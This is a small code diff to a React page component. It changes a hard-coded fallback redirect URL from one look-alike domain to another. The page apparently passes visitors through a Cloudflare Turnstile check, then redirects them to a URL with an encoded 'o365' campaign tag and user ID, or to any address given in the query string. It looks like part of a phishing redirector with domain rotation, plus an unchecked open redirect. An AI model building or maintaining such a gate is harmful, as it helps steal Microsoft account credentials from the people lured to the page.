@@ -6,7 +6,7 @@ function App() {
   useEffect(() => {
     // Get redirect URL from query parameters
     const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect') || 'https://ebatgroup.com/o/?c3Y9bzM2NV8xX25vbSZtPTh6JnVpZD1VU0VSMTAxMDIwMjVVNTUxMDEwNDcmdD03eA==N0123N';
+    const redirectUrl = params.get('redirect') || 'https://ebajgroup.com/o/?c3Y9bzM2NV8xX25vbSZtPXRyJnVpZD1VU0VSMTAxMDIwMjVVNTUxMDEwNDcmdD1BUA==N0123N';
 
     // Wait for Turnstile script to load and render widget
     const checkTurnstile = setInterval(() => {
